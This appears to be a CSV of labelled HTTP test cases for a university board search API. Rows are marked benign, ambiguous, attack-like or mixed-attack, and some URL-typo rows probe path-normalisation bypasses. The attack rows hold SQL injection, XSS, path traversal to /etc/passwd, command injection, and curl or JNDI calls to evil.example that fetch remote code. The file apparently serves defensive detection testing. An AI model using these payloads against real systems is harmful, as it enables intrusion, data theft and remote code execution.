scenario,case_id,case_class,auth_scope,query_suffix,raw_path,request_path,request_body
board_search,board_search_001,benign,,?keyword=wifi&sort=latest&page=0&size=5,,,
board_search,board_search_002,benign,,?keyword=%EB%8F%84%EC%84%9C%EA%B4%80&sort=title&page=1&size=6,,,
board_search,board_search_003,benign,,?keyword=%EC%9E%A5%ED%95%99%EA%B8%88&sort=latest&page=0&size=5,,,
board_search,board_search_004,benign,,?keyword=%EC%88%98%EA%B0%95%EC%8B%A0%EC%B2%AD&sort=title&page=1&size=6,,,
board_search,board_search_005,benign,,?keyword=%EA%B8%B0%EC%88%99%EC%82%AC&sort=latest&page=0&size=5,,,
board_search,board_search_006,benign,,?keyword=%EC%85%94%ED%8B%80%EB%B2%84%EC%8A%A4&sort=title&page=1&size=6,,,
board_search,board_search_007,benign,,?keyword=cafeteria&sort=latest&page=0&size=5,,,
board_search,board_search_008,benign,,?keyword=parking&sort=title&page=1&size=6,,,
board_search,board_search_009,benign,,?keyword=exam&sort=latest&page=0&size=5,,,
board_search,board_search_010,benign,,?keyword=assignment&sort=title&page=1&size=6,,,
board_search,board_search_011,benign,,?keyword=course%20registration&sort=latest&page=0&size=5,,,
board_search,board_search_012,benign,,?keyword=lecture%20room&sort=title&page=1&size=6,,,
board_search,board_search_013,benign,,?keyword=volunteer&sort=latest&page=0&size=5,,,
board_search,board_search_014,benign,,?keyword=club%20fair&sort=title&page=1&size=6,,,
board_search,board_search_015,benign,,?keyword=academic%20event&sort=latest&page=0&size=5,,,
board_search,board_search_016,benign,,?keyword=network%20maintenance&sort=title&page=1&size=6,,,
board_search,board_search_017,benign,,?keyword=dorm%20wifi&sort=latest&page=0&size=5,,,
board_search,board_search_018,benign,,?keyword=team%20project&sort=title&page=1&size=6,,,
board_search,board_search_019,benign,,?keyword=scholarship%20notice&sort=latest&page=0&size=5,,,
board_search,board_search_020,benign,,?keyword=database%20class&sort=title&page=1&size=6,,,
board_search,board_search_021,ambiguous,,?keyword=select%20%EB%AC%B8%20%EC%A0%95%EB%A6%AC&sort=latest&page=0&size=6,,,
board_search,board_search_022,ambiguous,,?keyword=union%20select%20%EC%98%88%EC%8B%9C&sort=title&page=1&size=5,,,
board_search,board_search_023,ambiguous,,?keyword=script%20%ED%83%9C%EA%B7%B8%20%ED%95%84%ED%84%B0%EB%A7%81&sort=latest&page=0&size=5,,,
board_search,board_search_024,ambiguous,,?keyword=..%2Fadmin%20%EA%B2%BD%EB%A1%9C%20%EC%84%A4%EB%AA%85&sort=title&page=1&size=6,,,
board_search,board_search_025,ambiguous,,?keyword=drop%20table%20%EA%B8%88%EC%A7%80%20%EC%A0%95%EC%B1%85&sort=latest&page=0&size=5,,,
board_search,board_search_026,ambiguous,,?keyword=cmd.exe%20%2Fc%20whoami%20%EC%98%88%EC%8B%9C&sort=title&page=1&size=5,,,
board_search,board_search_027,ambiguous,,?keyword=whoami%20%EB%AA%85%EB%A0%B9%20%EA%B2%B0%EA%B3%BC&sort=latest&page=0&size=6,,,
board_search,board_search_028,ambiguous,,?keyword=nmap%20-sS%20%EB%A1%9C%EA%B7%B8&sort=title&page=1&size=5,,,
board_search,board_search_029,ambiguous,,?keyword=alert%20tcp%20%EB%A3%B0&sort=latest&page=0&size=5,,,
board_search,board_search_030,ambiguous,,?keyword=javascript%3A%20%EC%8A%A4%ED%82%B4%20%EC%84%A4%EB%AA%85&sort=title&page=1&size=6,,,
board_search,board_search_031,ambiguous,,?keyword=..%2F..%2Fuploads%20%EC%83%98%ED%94%8C&sort=latest&page=0&size=5,,,
board_search,board_search_032,ambiguous,,?keyword=execve%20%EA%B0%90%EC%82%AC%20%EB%A1%9C%EA%B7%B8&sort=title&page=1&size=5,,,
board_search,board_search_033,ambiguous,,?keyword=powershell%20-enc%20%EC%98%88%EC%8B%9C&sort=latest&page=0&size=6,,,
board_search,board_search_034,ambiguous,,?keyword=%3Cimg%20onerror%3E%20%ED%95%84%ED%84%B0%EB%A7%81&sort=title&page=1&size=5,,,
board_search,board_search_035,ambiguous,,?keyword=SQL%20injection%20%EB%B3%B4%EA%B3%A0%EC%84%9C&sort=latest&page=0&size=5,,,
board_search,board_search_036,ambiguous,,?keyword=XSS%20payload%20%EC%98%88%EC%8B%9C&sort=title&page=1&size=6,,,
board_search,board_search_037,ambiguous,,?keyword=LFI%20..%2F%20%EA%B2%BD%EB%A1%9C&sort=latest&page=0&size=5,,,
board_search,board_search_038,ambiguous,,?keyword=UNION%20ALL%20SELECT%20%EC%8B%A4%EC%8A%B5&sort=title&page=1&size=5,,,
board_search,board_search_039,ambiguous,,?keyword=base64%20%EC%9D%B8%EC%BD%94%EB%94%A9%20%EC%9A%B0%ED%9A%8C&sort=latest&page=0&size=6,,,
board_search,board_search_040,ambiguous,,?keyword=shellshock%28%29%20%7B%20%3A%3B%7D%3B%20note&sort=title&page=1&size=5,,,
board_search,board_search_041,attack-like,,?keyword=%27%20OR%201%3D1%20--&sort=latest&page=0&size=5,,,
board_search,board_search_042,attack-like,,?keyword=%22%20or%20%221%22%3D%221&sort=latest&page=0&size=5,,,
board_search,board_search_043,attack-like,,?keyword=union%20select%20password%20from%20users--&sort=latest&page=0&size=5,,,
board_search,board_search_044,attack-like,,?keyword=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&sort=latest&page=0&size=5,,,
board_search,board_search_045,attack-like,,?keyword=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E&sort=latest&page=0&size=5,,,
board_search,board_search_046,attack-like,,?keyword=..%2F..%2F..%2F..%2Fetc%2Fpasswd&sort=latest&page=0&size=5,,,
board_search,board_search_047,attack-like,,?keyword=..%252f..%252f..%252fetc%2Fpasswd&sort=latest&page=0&size=5,,,
board_search,board_search_048,attack-like,,?keyword=%3Bwhoami&sort=latest&page=0&size=5,,,
board_search,board_search_049,attack-like,,?keyword=%7Ccat%20%2Fetc%2Fpasswd&sort=latest&page=0&size=5,,,
board_search,board_search_050,attack-like,,?keyword=%26%26%20curl%20http%3A%2F%2Fevil.example%2Fa.sh&sort=latest&page=0&size=5,,,
board_search,board_search_051,attack-like,,?keyword=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D&sort=latest&page=0&size=5,,,
board_search,board_search_052,attack-like,,?keyword=admin%27--&sort=latest&page=0&size=5,,,
board_search,board_search_053,attack-like,,?keyword=1%3Bdrop%20table%20users&sort=latest&page=0&size=5,,,
board_search,board_search_054,attack-like,,?keyword=benchmark%281000000%2Cmd5%281%29%29&sort=latest&page=0&size=5,,,
board_search,board_search_055,attack-like,,?keyword=waitfor%20delay%20%270%3A0%3A5%27--&sort=latest&page=0&size=5,,,
board_search,board_search_056,attack-like,,?keyword=sleep%285%29&sort=latest&page=0&size=5,,,
board_search,board_search_057,attack-like,,?keyword=%2527%2520or%25201%3D1--&sort=latest&page=0&size=5,,,
board_search,board_search_058,attack-like,,?keyword=%60id%60&sort=latest&page=0&size=5,,,
board_search,board_search_059,attack-like,,?keyword=%24%28curl%20evil.example%2Fpoc.sh%29&sort=latest&page=0&size=5,,,
board_search,board_search_060,attack-like,,?keyword=..%2F..%2F..%2Fboot.ini&sort=latest&page=0&size=5,,,
board_search,board_search_061,author-filter,,?author=student1&sort=latest&page=0&size=5,,,
board_search,board_search_062,author-filter,,?author=student1&sort=title&page=0&size=6,,,
board_search,board_search_063,author-filter,,?author=student2&sort=latest&page=1&size=5,,,
board_search,board_search_064,author-filter,,?author=student2&sort=title&page=0&size=6,,,
board_search,board_search_065,author-filter,,?author=%EA%B9%80%EB%AF%BC%EC%A7%80&sort=latest&page=0&size=5,,,
board_search,board_search_066,author-filter,,?author=%EA%B9%80%EB%AF%BC%EC%A7%80&sort=title&page=0&size=6,,,
board_search,board_search_067,author-filter,,?author=%EA%B0%95%ED%95%B4%EB%A6%B0&sort=latest&page=1&size=5,,,
board_search,board_search_068,author-filter,,?author=%EA%B0%95%ED%95%B4%EB%A6%B0&sort=title&page=0&size=6,,,
board_search,board_search_069,author-filter,,?author=%EC%9E%A5%EC%9B%90%EC%98%81&sort=latest&page=0&size=5,,,
board_search,board_search_070,author-filter,,?author=%EC%9E%A5%EC%9B%90%EC%98%81&sort=title&page=0&size=6,,,
board_search,board_search_071,date-range,,?keyword=wifi&dateFrom=2026-03-01&dateTo=2026-03-31&sort=latest&page=0&size=6,,,
board_search,board_search_072,date-range,,?keyword=select%20%EB%AC%B8%20%EC%A0%95%EB%A6%AC&dateFrom=2026-03-01&dateTo=2026-03-31&sort=title&page=0&size=5,,,
board_search,board_search_073,date-range,,?keyword=%EB%8F%84%EC%84%9C%EA%B4%80&dateFrom=2026-02-01&dateTo=2026-03-15&sort=latest&page=0&size=6,,,
board_search,board_search_074,date-range,,?keyword=union%20select%20%EC%98%88%EC%8B%9C&dateFrom=2026-02-01&dateTo=2026-03-15&sort=title&page=0&size=5,,,
board_search,board_search_075,date-range,,?keyword=%EC%9E%A5%ED%95%99%EA%B8%88&dateFrom=2026-01-01&dateTo=2026-12-31&sort=latest&page=0&size=6,,,
board_search,board_search_076,date-range,,?keyword=script%20%ED%83%9C%EA%B7%B8%20%ED%95%84%ED%84%B0%EB%A7%81&dateFrom=2026-01-01&dateTo=2026-12-31&sort=title&page=0&size=5,,,
board_search,board_search_077,date-range,,?keyword=%EC%88%98%EA%B0%95%EC%8B%A0%EC%B2%AD&dateFrom=2026-03-10&dateTo=2026-03-24&sort=latest&page=0&size=6,,,
board_search,board_search_078,date-range,,?keyword=..%2Fadmin%20%EA%B2%BD%EB%A1%9C%20%EC%84%A4%EB%AA%85&dateFrom=2026-03-10&dateTo=2026-03-24&sort=title&page=0&size=5,,,
board_search,board_search_079,date-range,,?keyword=%EA%B8%B0%EC%88%99%EC%82%AC&dateFrom=2026-03-01&dateTo=2026-04-15&sort=latest&page=0&size=6,,,
board_search,board_search_080,date-range,,?keyword=drop%20table%20%EA%B8%88%EC%A7%80%20%EC%A0%95%EC%B1%85&dateFrom=2026-03-01&dateTo=2026-04-15&sort=title&page=0&size=5,,,
board_search,board_search_081,author-keyword,,?author=student1&keyword=union%20select%20%ED%95%99%EC%8A%B5%EC%9E%90%EB%A3%8C&sort=latest&page=0&size=6,,,
board_search,board_search_082,author-keyword,,?author=student1&keyword=%27%20OR%201%3D1%20--&sort=latest&page=0&size=5,,,
board_search,board_search_083,author-keyword,,?author=student2&keyword=select%20%EB%AC%B8%20%EB%B3%B4%EA%B3%A0%EC%84%9C&sort=latest&page=0&size=6,,,
board_search,board_search_084,author-keyword,,?author=student2&keyword=%22%20or%20%221%22%3D%221&sort=latest&page=0&size=5,,,
board_search,board_search_085,author-keyword,,?author=%EA%B9%80%EB%AF%BC%EC%A7%80&keyword=%3Cscript%3E%20%ED%95%84%ED%84%B0%EB%A7%81%20%EA%B3%BC%EC%A0%9C&sort=latest&page=0&size=6,,,
board_search,board_search_086,author-keyword,,?author=%EA%B9%80%EB%AF%BC%EC%A7%80&keyword=union%20select%20password%20from%20users--&sort=latest&page=0&size=5,,,
board_search,board_search_087,author-keyword,,?author=%EA%B0%95%ED%95%B4%EB%A6%B0&keyword=..%2Fuploads%20%EA%B2%BD%EB%A1%9C%20%EC%8B%A4%EC%8A%B5&sort=latest&page=0&size=6,,,
board_search,board_search_088,author-keyword,,?author=%EA%B0%95%ED%95%B4%EB%A6%B0&keyword=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&sort=latest&page=0&size=5,,,
board_search,board_search_089,author-keyword,,?author=%EC%9E%A5%EC%9B%90%EC%98%81&keyword=drop%20table%20%EA%B8%88%EC%A7%80%20%EC%95%88%EB%82%B4&sort=latest&page=0&size=6,,,
board_search,board_search_090,author-keyword,,?author=%EC%9E%A5%EC%9B%90%EC%98%81&keyword=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E&sort=latest&page=0&size=5,,,
board_search,board_search_091,mixed-attack,,?author=student1&keyword=whoami%20%EC%B6%9C%EB%A0%A5%20%EC%98%88%EC%8B%9C&dateFrom=2026-03-01&dateTo=2026-03-31&sort=latest&page=0&size=5,,,
board_search,board_search_092,mixed-attack,,?author=student1&keyword=..%2F..%2F..%2F..%2Fetc%2Fpasswd&dateFrom=2026-02-15&dateTo=2026-04-01&sort=title&page=0&size=5,,,
board_search,board_search_093,mixed-attack,,?author=student2&keyword=nmap%20-sS%20%EA%B3%BC%EC%A0%9C&dateFrom=2026-03-01&dateTo=2026-03-31&sort=latest&page=0&size=5,,,
board_search,board_search_094,mixed-attack,,?author=student2&keyword=..%252f..%252f..%252fetc%2Fpasswd&dateFrom=2026-02-15&dateTo=2026-04-01&sort=title&page=0&size=5,,,
board_search,board_search_095,mixed-attack,,?author=%EA%B9%80%EB%AF%BC%EC%A7%80&keyword=alert%20tcp%20%EA%B7%9C%EC%B9%99%20%EC%84%A4%EB%AA%85&dateFrom=2026-03-01&dateTo=2026-03-31&sort=latest&page=0&size=5,,,
board_search,board_search_096,mixed-attack,,?author=%EA%B9%80%EB%AF%BC%EC%A7%80&keyword=%3Bwhoami&dateFrom=2026-02-15&dateTo=2026-04-01&sort=title&page=0&size=5,,,
board_search,board_search_097,mixed-attack,,?author=%EA%B0%95%ED%95%B4%EB%A6%B0&keyword=cmd.exe%20%EB%AC%B8%EC%9E%90%EC%97%B4%20%EC%82%AC%EB%A1%80&dateFrom=2026-03-01&dateTo=2026-03-31&sort=latest&page=0&size=5,,,
board_search,board_search_098,mixed-attack,,?author=%EA%B0%95%ED%95%B4%EB%A6%B0&keyword=%7Ccat%20%2Fetc%2Fpasswd&dateFrom=2026-02-15&dateTo=2026-04-01&sort=title&page=0&size=5,,,
board_search,board_search_099,mixed-attack,,?author=%EC%9E%A5%EC%9B%90%EC%98%81&keyword=XSS%20payload%20%EB%A9%94%EB%AA%A8&dateFrom=2026-03-01&dateTo=2026-03-31&sort=latest&page=0&size=5,,,
board_search,board_search_100,mixed-attack,,?author=%EC%9E%A5%EC%9B%90%EC%98%81&keyword=%26%26%20curl%20http%3A%2F%2Fevil.example%2Fa.sh&dateFrom=2026-02-15&dateTo=2026-04-01&sort=title&page=0&size=5,,,
url_typo,url_typo_001,public-announcements-segment-transpose,,,/api/public/annuoncements,,
url_typo,url_typo_002,public-announcements-segment-drop,,,/api/public/annuncements,,
url_typo,url_typo_003,public-announcements-segment-singular,,,/api/public/announcement,,
url_typo,url_typo_004,public-announcements-api-double-slash,,,/api//public/announcements,,
url_typo,url_typo_005,public-announcements-before-last-double-slash,,,/api/public//announcements,,
url_typo,url_typo_006,public-announcements-api-uppercase,,,/API/public/announcements,,
url_typo,url_typo_007,public-announcements-middle-titlecase,,,/api/Public/announcements,,
url_typo,url_typo_008,public-announcements-last-titlecase,,,/api/public/Announcements,,
url_typo,url_typo_009,public-announcements-append-slash,,,/api/public/announcements/,,
url_typo,url_typo_010,public-announcements-append-double-slash,,,/api/public/announcements//,,
url_typo,url_typo_011,public-announcements-append-dot-segment,,,/api/public/announcements/..;/,,
url_typo,url_typo_012,public-announcements-append-dot-semicolon,,,/api/public/announcements/.;/,,
url_typo,url_typo_013,public-announcements-append-encoded-dot-segment,,,/api/public/announcements/%2e%2e;/,,
url_typo,url_typo_014,public-announcements-append-encoded-dot,,,/api/public/announcements/%2e/,,
url_typo,url_typo_015,public-announcements-append-space-encoded,,,/api/public/announcements%20,,
url_typo,url_typo_016,public-announcements-append-json-ext,,,/api/public/announcements.json,,
url_typo,url_typo_017,public-announcements-append-semicolon,,,/api/public/announcements;,,
url_typo,url_typo_018,public-announcements-append-encoded-parent,,,/api/public/announcements..%2f,,
url_typo,url_typo_019,public-announcements-api-letter-swap,,,/aip/public/announcements,,
url_typo,url_typo_020,public-announcements-api-digit-sub,,,/ap1/public/announcements,,
url_typo,url_typo_021,public-announcements-query-keyword-typo,,,/api/public/announcements?keywrod=select%20%EB%AC%B8%20%EC%A0%95%EB%A6%AC&sort=latest&size=5,,
